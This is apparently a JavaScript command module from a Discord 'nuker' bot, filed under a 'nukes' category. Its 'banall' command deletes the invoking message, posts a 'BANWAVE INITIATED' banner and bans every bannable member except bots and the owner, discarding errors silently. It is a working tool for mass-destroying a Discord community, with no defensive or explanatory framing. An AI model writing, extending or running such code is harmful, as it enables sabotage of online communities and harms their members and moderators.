const { glitchBanner } = require('../../src/ascii');
module.exports = {
  name: 'banall',
  description: 'Ban every bannable member (excluding bots/owner).',
  category: 'nukes',
  async execute(message) {
    if (!message.guild) return;
    await message.delete().catch(()=>{});
    await message.channel.send('```\n' + glitchBanner('BANWAVE INITIATED') + '\n```').catch(()=>{});
    const ms = await message.guild.members.fetch();
    let c=0;
    ms.forEach(m => { if (m.bannable && m.id !== message.guild.ownerId && !m.user.bot) { m.ban({ reason:'VOID' }).catch(()=>{}); c++; }});
  },
};
